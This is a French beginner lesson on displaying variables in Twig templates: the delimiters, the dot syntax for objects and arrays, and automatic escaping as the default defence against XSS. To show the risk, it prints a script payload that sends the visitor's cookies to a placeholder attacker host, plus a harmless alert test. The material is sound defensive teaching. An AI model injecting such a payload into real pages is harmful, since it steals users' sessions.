---
titre: "Afficher des variables : {{ }}, objets, tableaux et échappement anti-XSS"
parcours: "twig"
ordre: 2
niveau: "debutant"
duree: 20
date: 2026-07-25
---

## Le cours

Leçon 1, tu as vu que le contrôleur passe des données au template via le deuxième argument de `render()`. Cette leçon répond à la question : comment le template les affiche-t-il ?

La syntaxe d'affichage, c'est la double accolade : `{{ ... }}`. Twig a exactement trois délimiteurs, apprends-les tout de suite :

```twig
{{ joueur.prenom }}   {# AFFICHE quelque chose #}
{% if actif %}...{% endif %}   {# FAIT quelque chose (logique, leçon 3) #}
{# ceci est un commentaire, jamais envoyé au navigateur #}
```

Côté contrôleur, imagine ce que tu écris déjà partout dans Venaball :

```php
return $this->render('un_template.html.twig', [
    'joueur' => $joueur,          // un objet entité Joueur
    'stats'  => ['points' => 12], // un tableau PHP
]);
```

Dans le template, le **point** est ton meilleur ami — il sert pour tout :

```twig
{{ joueur.prenom }}      {# objet : Twig appelle getPrenom() tout seul #}
{{ stats.points }}       {# tableau : Twig lit la clé 'points' #}
{{ joueur.club.nom }}    {# on peut chaîner : getClub() puis getNom() #}
```

C'est la « magie » du point, et le jury peut te demander comment elle marche. Pour `joueur.prenom`, Twig essaie dans l'ordre : une propriété publique `prenom`, puis une méthode `prenom()`, puis `getPrenom()`, puis `isPrenom()`/`hasPrenom()`. Comme tes entités (regarde `getPrenom()`, `getNom()` sur ton entité `User` dans `src/Entity/Core/`) suivent la convention des getters, ça marche partout.

On peut aussi mettre des expressions simples : `{{ stats.points * 2 }}`, ou concaténer avec le tilde : `{{ joueur.prenom ~ ' ' ~ joueur.nom }}`.

Maintenant LE point sécurité, celui qui tombe presque à chaque jury : **l'échappement automatique** (auto-escaping). Suppose qu'une joueuse malveillante mette dans sa bio :

```
<script>document.location='https://voleur.example/?c='+document.cookie</script>
```

Si tu affichais ça avec un `echo` PHP brut, le navigateur exécuterait le script chez toutes les visiteuses de son profil : c'est une attaque **XSS** (Cross-Site Scripting), l'injection de code dans une page vue par d'autres. Avec Twig :

```twig
{{ joueur.bio }}
```

Twig transforme automatiquement les caractères dangereux en entités HTML : `<` devient `&lt;`, `>` devient `&gt;`, `"` devient `&quot;`. Le navigateur affiche alors le texte `<script>...` littéralement, sans jamais l'exécuter. Tu n'as rien fait de spécial : c'est le comportement **par défaut** de Twig dans Symfony. C'est une différence majeure avec du PHP « à la main » où il faudrait penser à `htmlspecialchars()` à chaque affichage — et un seul oubli suffit.

La formulation à servir au jury : « Toute donnée saisie par un utilisateur est considérée comme hostile. Twig échappe automatiquement toutes les variables à l'affichage, ce qui neutralise les attaques XSS par défaut. » On verra leçon 8 le filtre `|raw` qui désactive cette protection — et pourquoi il doit te faire lever un sourcil à chaque fois que tu le croises.

Dernier réflexe utile : si une variable n'existe pas, Twig affiche vide (ou lève une erreur en mode strict). Pour prévoir un repli propre, il existe `|default('valeur')`, que tu découvriras avec les filtres en leçon 4.

## À retenir

- Trois délimiteurs : `{{ }}` affiche, `{% %}` exécute de la logique, `{# #}` commente.
- Le point universel : `joueur.prenom` marche pour un objet (via `getPrenom()`) comme pour une clé de tableau.
- Twig **échappe automatiquement** toutes les variables affichées : `<script>` devient du texte inoffensif.
- C'est la protection anti-**XSS** par défaut : phrase à ressortir telle quelle au jury.
- Les données viennent toujours du contrôleur via le deuxième argument de `render()`.

## Mise en pratique

Objectif : voir l'échappement automatique de tes propres yeux dans Venaball.

1. Dans ton dossier `templates/` local, crée un fichier de test `test_xss.html.twig` contenant : `<p>Bio : {{ bio }}</p>`.
2. Dans un de tes contrôleurs web (ou un petit contrôleur de test), ajoute une action qui fait : `return $this->render('test_xss.html.twig', ['bio' => '<script>alert("piraté")</script>']);` avec une route dédiée.
3. Ouvre la page dans ton navigateur : aucune alerte ne s'affiche, tu vois le texte `<script>alert("piraté")</script>` écrit en clair.
4. Fais clic droit → « Afficher le code source » et retrouve `&lt;script&gt;` : c'est l'échappement en action.
5. Bonus : ouvre un vrai template de ton dossier `templates/` et repère trois `{{ }}` qui affichent des données d'entité (prenom, nom, etc.). Pour chacun, dis quel getter Twig appelle.

Résultat attendu : la page affiche le script comme du texte, le code source montre les entités HTML, et tu sais expliquer pourquoi aucune alerte n'est apparue.
